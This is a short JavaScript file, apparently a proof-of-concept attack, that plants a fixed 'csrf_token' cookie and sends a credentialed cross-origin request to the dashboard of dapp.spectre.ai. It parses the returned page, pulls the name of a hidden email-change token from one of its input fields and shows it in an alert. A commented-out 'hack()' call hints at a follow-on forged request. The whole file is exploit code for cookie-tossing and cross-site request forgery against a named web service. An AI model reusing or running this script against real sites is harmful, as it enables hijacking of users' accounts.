



function plantCookie()
{
	
	document.cookie = "csrf_token=tabahi";
	
}



emailCSRFAttack();

function emailCSRFAttack()
{
	
	var fetchHash = new XMLHttpRequest();

	var url = "https://dapp.spectre.ai/dashboard";
	var datax;
	var all_elements;
	var vc_email_token='initial';

	fetchHash.onreadystatechange=function ()
	{
		if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[49].name;
					   alert('Your token name: '+vc_email_token);
					   //hack(vc_email_token);


        }

	}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
	
	
	
}